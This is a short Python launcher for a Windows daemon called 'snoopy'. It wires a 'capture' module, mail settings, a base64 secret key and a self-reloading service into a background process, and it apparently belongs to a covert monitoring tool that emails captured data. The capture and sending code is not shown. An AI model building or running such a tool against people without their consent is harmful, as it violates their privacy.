from lib.file_finder import get_embedded_filename
from lib.daemon import Daemon
from win32.killer import GracefulKiller
from win32 import capture as catcher

directory         = r'C:\users\rwilson\code\snoopy'
# directory         = 'C:\\Users\\rwilson\\code\\snoopy'
installation_path = '{}\\dist\\snoopy'.format(directory)
secret_key        = 'cHdk'
# secret_key        = 'U1VQRVJfU0VDUkVUX0tFWQ=='
mail_config       = 'mail.config'
reloader_name     = 'reload_service.exe'


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            mail_config,
            secret_key,
            installation_path,
            directory,
            catcher)

    def setup(self):
        pass


if __name__ == "__main__":
    killer = GracefulKiller(
        MyDaemon(),
        get_embedded_filename(reloader_name))
    killer.run()
